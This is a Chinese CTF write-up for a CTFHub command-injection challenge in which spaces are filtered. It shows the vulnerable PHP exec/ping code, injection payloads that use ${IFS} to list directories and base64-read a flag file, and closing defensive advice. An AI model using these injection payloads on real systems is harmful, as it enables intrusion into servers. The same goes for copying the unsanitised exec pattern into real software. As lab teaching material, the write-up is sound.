---
title: CTFHub 命令注入-过滤空格
date: 2026-10-23
categories: CTFHub Web 命令注入 空格过滤绕过 
tags: CTFHub Web 命令注入 空格过滤绕过 
---

# 题目: CTFHub 命令注入-过滤空格

## 题目描述
打开题目页面，源码如下：
```php
<?php
$res = FALSE;
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/ /", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>
```
*分析：*
服务器使用 preg_match_all("/ /", $ip, $m) 拦截了空格。
其他字符未做过滤。

## 解题思路
### 漏洞原理
在 Linux 中，${IFS} 是一个环境变量（Internal Field Separator），默认包含空格、制表符和换行符。当 Shell 解析命令时，会自动将 ${IFS} 替换为空格。

### 攻击链
使用 127.0.0.1;ls${IFS}/ 测试绕过空格。
使用 127.0.0.1;ls${IFS}/var/www/html/ 查找 flag 文件。
使用 base64 编码读取 flag 文件。

## 解题步骤
1. 测试空格绕过
在输入框输入：
```text
127.0.0.1;ls${IFS}/
```
返回结果：
成功列出了根目录下的文件。

3. 定位 Flag 文件
输入：
```text
127.0.0.1;ls${IFS}/var/www/html/
```
返回结果：
找到了目标文件 flag_456651965418.php。

3. 读取 Flag
因为 flag 很可能藏在 PHP 注释里，直接 cat 可能会被 exec 过滤。使用 base64 强制读取：
```text
127.0.0.1;base64${IFS}/var/www/html/flag_456651965418.php
```
解码 Base64 得到：
```php
<?php // ctfhub{223121c78f399fb2e35d9e57}
```
提交 flag，通关！

## 踩坑指南
1. 直接使用常规命令带空格
原因： 代码中 / / 正则匹配了所有空格，直接输入 cat flag.php 会被拦截。
解决： 使用 ${IFS} 替代空格。

2. cat 回显被吞
原因： exec 函数可能会忽略 PHP 注释内容。
解决： 使用 base64 命令，强行将文件内容编码输出。

## 知识点总结

| 知识点 | 说明 |
| :--- | :--- |
| `${IFS}` | Linux 内部字段分隔符，可作为空格替代 |
| 命令注入绕过 | 使用特殊变量和符号绕过黑名单 |
| `base64` | 编码输出命令，用于绕过回显限制 |

### 防御建议
1. 使用白名单：严格限制 ip 参数只能是合法 IP 格式。
2. 过滤特殊变量：拦截 ${IFS}、$IFS 等特殊变量。
